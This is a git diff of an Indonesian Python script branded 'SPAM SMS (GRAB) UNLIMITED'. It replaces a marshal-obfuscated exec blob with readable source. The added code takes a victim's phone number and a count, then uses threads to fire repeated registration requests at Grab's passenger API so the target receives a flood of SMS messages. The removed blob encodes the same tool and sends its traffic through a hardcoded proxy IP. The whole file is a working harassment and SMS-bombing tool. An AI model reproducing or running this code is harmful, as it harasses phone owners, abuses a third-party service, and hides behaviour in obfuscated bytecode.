@@ -1,9 +1,51 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-# author: KANG-NEWBIE
+# Coded by KANG-NEWBIE
 """
 ngapai bosq? mau recode?
 tinggal pake aja susah amat sih?!
 """
-import marshal
-exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00@\x00\x00\x00s\xec\x01\x00\x00d\x00Z\x00yjd\x01d\x02l\x01Z\x01d\x01d\x02l\x02Z\x02d\x01d\x03l\x03m\x04Z\x05\x01\x00d\x01d\x02l\x06Z\x07e\x01\xa0\x08d\x04\xa1\x01\x01\x00e\td\x05\x83\x01\x01\x00e\td\x06\x83\x01\x01\x00e\x01\xa0\x08d\x07\xa1\x01\x01\x00e\x07j\nd\x08d\te\x07j\x0be\x07j\x0cd\n\x8d\x04\x01\x00d\x01d\x02l\rZ\rW\x00n*\x04\x00e\x0ek\nr\x98\x01\x00\x01\x00\x01\x00e\td\x0b\x83\x01\x01\x00e\td\x0c\x83\x01\x01\x00e\x0f\x83\x00\x01\x00Y\x00n\x02X\x00y2e\x01\xa0\x08d\x04\xa1\x01\x01\x00e\td\r\x83\x01\x01\x00e\x10d\x0e\x83\x01Z\x11e\x12e\x10d\x0f\x83\x01\x83\x01Z\x13e\x14e\x13\x83\x01Z\x15W\x00n"\x04\x00e\x16k\nr\xee\x01\x00\x01\x00\x01\x00e\td\x10\x83\x01\x01\x00e\x0f\x83\x00\x01\x00Y\x00n\x02X\x00e\x12d\x01\x83\x01Z\x17e\x12d\x01\x83\x01Z\x18y\x98e\t\x83\x00\x01\x00e\td\x11e\x15d\x12\x17\x00\x83\x02\x01\x00e\td\x13\x83\x01\x01\x00xve\x05e\x13\x83\x01\x01\x00d\x14Z\x19d\x15Z\x1ae\rj\x1bd\x16e\x11d\x17d\x18d\x19d\x1ad\x1b\x9c\x05d\x1cd\x1di\x01d\x1ee\x14e\x19\x83\x01i\x01d\x1f\x8d\x04Z\x1ce\x14e\x1a\x83\x01e\x14e\x1cj\x1d\x83\x01k\x06\x90\x01r\x80e\x17d 7\x00Z\x17e\td!\x83\x01\x01\x00n\x10e\x18d 7\x00Z\x18e\td"\x83\x01\x01\x00\x90\x01q W\x00W\x00n>\x04\x00e\x1ek\n\x90\x01r\xb6\x01\x00\x01\x00\x01\x00e\td#\x83\x01\x01\x00Y\x00n"\x04\x00e\rj\x1fj k\n\x90\x01r\xd6\x01\x00\x01\x00\x01\x00e\td$\x83\x01\x01\x00Y\x00n\x02X\x00e\td%e\x17d&e\x18d\'\x83\x05\x01\x00d\x02S\x00)(z<\nngapai bosq? mau recode?\ntinggal pake aja susah amat sih?!\n\xe9\x00\x00\x00\x00N)\x01\xda\x05sleep\xda\x05clearz\x19\x1b[1;33m[!] Please Wait...z\x10[!] Last Update:z\x0fdate -r grab.pyz\x14pip install requestsT)\x03\xda\x05shell\xda\x06stdout\xda\x06stderrz,\nSepertinya module requests BELUM Di Installz\x17$ pip install requests\na\x15\x01\x00\x00\x1b[1;32m\n   _  _     \x1b[1;36mSPAM SMS (GRAB) UNLIMITED\x1b[1;32m\n _| || |_   \x1b[1;31mAuthor : KANG-NEWBIE\x1b[1;32m\n|_  ..  _|  \x1b[1;31mContact : https://t.me/kang_nuubi\x1b[1;32m\n|_      _|  \x1b[1;31mgithub : https://github.com/KANG-NRWBIE\x1b[1;32m\n  |_||_|    \x1b[1;33mCTRL + C Untuk Stop\x1b[32m\nz*\x1b[1;37m[?] NOMOR (Pakai 62 Gan) =>\x1b[1;36m z\'\x1b[1;37m[?] MASUKAN JEDA/SPAM => \x1b[1;36mz\x1a\nMasukan Angka Untuk Delayz\x1c[!] Mencoba Spam Dengan Jeda\xda\x01sz\x0c[*] RESULT:\nz\x1chttps://163.172.220.221:8888\xda\x0bphoneNumberz9https://p.grabtaxi.com/api/passenger/v2/profiles/registerZ\x02IDZ\x05nuubiz\x0enuubi@mail.com\xda\x01*)\x05r\x08\x00\x00\x00Z\x0bcountryCode\xda\x04nameZ\x05emailZ\x0bdeviceTokenz\nUser-AgentzsMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36Z\x05https)\x03\xda\x04dataZ\x07headersZ\x07proxies\xe9\x01\x00\x00\x00z\x11\x1b[1;32m[+] SUKSESz\x10\x1b[1;31m[-] GAGALz*\x1b[1;31m\n[!] Keyboard Interrupt: Exiting...zD\x1b[1;31m\n[!] ERROR: Periksa koneksi anda atau coba beberapa saat lagiz\x1f\x1b[1;36mJumlah => \x1b[1;32mSUKSES[z\x0f] \x1b[1;31mGAGAL[\xfa\x01])!\xda\x07__doc__\xda\x02osZ\x06random\xda\x04timer\x02\x00\x00\x00Z\x04turu\xda\nsubprocessZ\x02sp\xda\x06system\xda\x05printZ\x04callZ\x07DEVNULLZ\x06STDOUTZ\x08requests\xda\x13ModuleNotFoundError\xda\x04exit\xda\x05inputZ\x02no\xda\x03int\xda\x01D\xda\x03str\xda\x01d\xda\nValueErrorZ\x03scsZ\x04failZ\x03oxyZ\x03idkZ\x04post\xda\x01r\xda\x04text\xda\x11KeyboardInterruptZ\nexceptions\xda\x0fConnectionError\xa9\x00r \x00\x00\x00r \x00\x00\x00\xda\x00\xda\x08<module>\x07\x00\x00\x00sZ\x00\x00\x00\x04\x02\x02\x01\x10\x01\x0c\x01\x08\x01\n\x01\x08\x01\x08\x01\n\x01\x16\x01\x0c\x01\x0e\x01\x08\x01\x08\x01\x0c\x02\x02\x01\n\x01\x02\x06\x06\x01\x08\x01\x0c\x01\x0c\x01\x0e\x01\x08\x01\x0c\x01\x08\x01\x08\x01\x02\x01\x06\x01\x0e\x01\x08\x01\x02\x01\x08\x01\x04\x01\x04\x01*\x01\x14\x01\x08\x01\n\x02\x08\x01\x12\x02\x10\x01\x0c\x01\x14\x01\x0e\x02'))
+from multiprocessing.pool import ThreadPool
+try:
+	import os, random
+	from time import sleep as turu
+	import subprocess as sp
+	import requests
+except ModuleNotFoundError:
+	print("\nSepertinya module requests BELUM Di Install")
+	print("$ pip install requests\n")
+	exit()
+
+try:
+	os.system('clear')
+	print("""\033[1;32m
+   _  _     \033[1;36mSPAM SMS (GRAB) UNLIMITED\033[1;32m
+ _| || |_   \033[1;31mAuthor : KANG-NEWBIE\033[1;32m
+|_  ..  _|  \033[1;31mContact : https://t.me/kang_nuubi\033[1;32m
+|_      _|  \033[1;31mgithub : https://github.com/KANG-NRWBIE\033[1;32m
+  |_||_| 
+""")
+	no = input("\033[1;37m[?] NOMOR (Pakai 62 Gan) =>\033[1;36m ")
+	jum=int(input("\033[1;37m[?] Jumlah => \033[1;36m"))
+except KeyboardInterrupt:
+	print("\nKey interrupt")
+	exit()
+print()
+print("[*] RESULT:")
+def main(arg):
+	try:
+		idk=('phoneNumber')
+		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+#		print(r.text)
+		if str(idk) in str(r.text):
+			print("\033[1;32m[+] SUKSES")
+		else:
+			print("\033[1;31m[-] GAGAL")
+	except: pass
+
+jobs = []
+for x in range(jum):
+    jobs.append(x)
+p=ThreadPool(5)
+p.map(main,jobs)
+print("done ^•^")
